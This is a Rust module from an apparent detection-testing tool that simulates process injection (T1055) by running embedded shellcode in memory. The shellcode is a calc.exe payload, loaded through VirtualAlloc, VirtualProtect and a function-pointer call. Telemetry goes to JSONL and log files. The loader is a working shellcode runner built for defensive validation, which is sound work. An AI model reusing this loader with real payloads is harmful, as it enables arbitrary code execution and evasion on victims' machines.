//! Executes an embedded (safe) test payload via in-memory execution to validate process-injection detection (T1055).

use crate::core::config::Config;
use crate::core::simulation::Simulation;
use crate::core::logger;
use anyhow::{anyhow, Context, Result};
use chrono::Utc;
use dirs::home_dir;
use serde::Serialize;
use std::fs::{create_dir_all, OpenOptions};
use std::io::Write;
use std::path::PathBuf;

#[cfg(target_os = "windows")]
use std::ptr::null_mut;
#[cfg(target_os = "windows")]
use winapi::um::memoryapi::{VirtualAlloc, VirtualProtect};


#[derive(Default)]
pub struct ProcInjSim;

#[derive(Serialize)]
struct CmdRecord {
    test_id: String,
    timestamp: String,
    command: String,
    exit_code: Option<i32>,
    stdout: String,
    stderr: String,
    parent: String,
}

impl ProcInjSim {
    fn telemetry_dir() -> Option<PathBuf> {
        if let Some(mut p) = home_dir() {
            p.push("Documents");
            p.push("MagnetTelemetry");
            Some(p)
        } else {
            None
        }
    }

    /// Normalize output: convert CRLF -> LF, trim, and keep readable.
    fn sanitize_output(s: &str) -> String {
        let replaced = s.replace("\r\n", "\n").replace('\r', "");
        replaced.trim().to_string()
    }

    /// Writes both JSONL (machine-readable) and .log (human-readable) files.
    fn write_record(cfg: &Config, rec: &CmdRecord) -> Result<()> {
        let dir = Self::telemetry_dir().ok_or_else(|| anyhow!("could not determine telemetry output path"))?;
        create_dir_all(&dir).with_context(|| format!("creating telemetry directory {}", dir.display()))?;

        // --- JSONL telemetry ---
        let mut jsonl_path = dir.clone();
        jsonl_path.push(format!("magnet_procinj_{}.jsonl", cfg.test_id));
        let mut jf = OpenOptions::new()
            .create(true)
            .append(true)
            .open(&jsonl_path)
            .with_context(|| format!("opening telemetry file {}", jsonl_path.display()))?;
        let j = serde_json::to_string(rec)?;
        writeln!(jf, "{}", j)?;

        // --- Human-readable log ---
        let mut log_path = dir;
        log_path.push(format!("magnet_procinj_{}.log", cfg.test_id));
        let mut lf = OpenOptions::new()
            .create(true)
            .append(true)
            .open(&log_path)
            .with_context(|| format!("opening human log {}", log_path.display()))?;

        let stdout = Self::sanitize_output(&rec.stdout);
        let stderr = Self::sanitize_output(&rec.stderr);

        writeln!(lf, "================================================================")?;
        writeln!(lf, "TEST ID   : {}", rec.test_id)?;
        writeln!(lf, "TIMESTAMP : {}", rec.timestamp)?;
        writeln!(lf, "COMMAND   : {}", rec.command)?;
        writeln!(
            lf,
            "EXIT CODE : {}",
            rec.exit_code.map(|c| c.to_string()).unwrap_or_else(|| "N/A".into())
        )?;
        writeln!(lf, "PARENT    : {}", rec.parent)?;
        writeln!(lf, "----------------------------------------------------------------")?;
        writeln!(lf, "STDOUT:\n{}", stdout)?;
        if !stderr.is_empty() {
            writeln!(lf, "----------------------------------------------------------------")?;
            writeln!(lf, "STDERR:\n{}", stderr)?;
        }
        writeln!(lf)?;

        Ok(())
    }

    /// Execute the embedded shellcode (Windows build).
    /// This function purposely avoids mutating outer `String`s inside `catch_unwind`.
    #[cfg(target_os = "windows")]
    fn execute_shellcode(&self, cfg: &Config) -> Result<()> {
        // Embedded shellcode (safe: calc.exe)
        let shellcode: [u8; 276] = [
            0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
            0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
            0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9,
            0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
            0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48,
            0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01,
            0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48,
            0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
            0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c,
            0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
            0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04,
            0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
            0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48,
            0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f,
            0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
            0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb,
            0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c,
            0x63, 0x2e, 0x65, 0x78, 0x65, 0x00,
        ];

        let parent = std::env::current_exe()
            .map(|p| p.display().to_string())
            .unwrap_or_else(|_| "<unknown>".to_string());

        logger::action_running("Executing shellcode");

        if cfg.dry_run {
            logger::info(&format!("dry-run: would execute shellcode"));
            logger::action_ok();
            // still record that we did a dry-run
            let rec = CmdRecord {
                test_id: cfg.test_id.clone(),
                timestamp: Utc::now().to_rfc3339(),
                command: "[shellcode execution - dry run]".to_string(),
                exit_code: None,
                stdout: "dry-run".to_string(),
                stderr: String::new(),
                parent,
            };
            let _ = Self::write_record(cfg, &rec);
            return Ok(());
        }

        // Execute in a closure and return a simple result type (no mutation of outer vars)
        let exec_result: std::thread::Result<Result<(), &'static str>> =
            std::panic::catch_unwind(|| unsafe {
                // allocate RW memory and copy shellcode in
                let exec = VirtualAlloc(
                    null_mut(),
                    shellcode.len(),
                    0x1000, // MEM_COMMIT | MEM_RESERVE typically; using literal for brevity
                    0x04,   // PAGE_READWRITE
                );

                if exec.is_null() {
                    return Err("VirtualAlloc returned null");
                }

                std::ptr::copy_nonoverlapping(shellcode.as_ptr(), exec as *mut u8, shellcode.len());

                // change to RX (executable) memory
                let mut old_protect: u32 = 0;
                let protect_ok = VirtualProtect(exec, shellcode.len(), 0x40, &mut old_protect);
                if protect_ok == 0 {
                    // VirtualProtect returns non-zero on success
                    return Err("VirtualProtect failed");
                }

                // cast to function pointer and call
                let func: extern "C" fn() = std::mem::transmute(exec);
                func();

                Ok(())
            });

        // Interpret results and prepare telemetry strings outside the unwind boundary
        let (exit_code, stdout, stderr) = match exec_result {
            Ok(Ok(())) => {
                logger::action_ok();
                (Some(0), "Shellcode executed successfully.".to_string(), String::new())
            }
            Ok(Err(e)) => {
                logger::action_fail("shellcode execution failed");
                (None, String::new(), format!("Shellcode error: {}", e))
            }
            Err(_) => {
                logger::action_fail("shellcode panic");
                (None, String::new(), "Shellcode panicked during execution.".to_string())
            }
        };

        // Write telemetry
        let rec = CmdRecord {
            test_id: cfg.test_id.clone(),
            timestamp: Utc::now().to_rfc3339(),
            command: "[shellcode execution]".to_string(),
            exit_code,
            stdout,
            stderr,
            parent,
        };

        if let Err(e) = Self::write_record(cfg, &rec) {
            logger::error(&format!("Failed to write telemetry: {}", e));
            logger::action_fail("telemetry write failure");
        }

        Ok(())
    }

    /// Non-Windows stub: report not-supported, still write telemetry.
    #[cfg(not(target_os = "windows"))]
    fn execute_shellcode(&self, cfg: &Config) -> Result<()> {
        let parent = std::env::current_exe()
            .map(|p| p.display().to_string())
            .unwrap_or_else(|_| "<unknown>".to_string());

        logger::info("execute_shellcode: not supported on this platform");

        let rec = CmdRecord {
            test_id: cfg.test_id.clone(),
            timestamp: Utc::now().to_rfc3339(),
            command: "[shellcode execution]".to_string(),
            exit_code: None,
            stdout: String::new(),
            stderr: "not supported on this platform".to_string(),
            parent,
        };

        if let Err(e) = Self::write_record(cfg, &rec) {
            logger::error(&format!("Failed to write telemetry: {}", e));
        }

        Ok(())
    }
}

impl Simulation for ProcInjSim {
    fn name(&self) -> &'static str {
        "windows::proc_inj_sim"
    }

    fn run(&self, cfg: &Config) -> Result<()> {
        self.execute_shellcode(cfg)?;
        Ok(())
    }
}
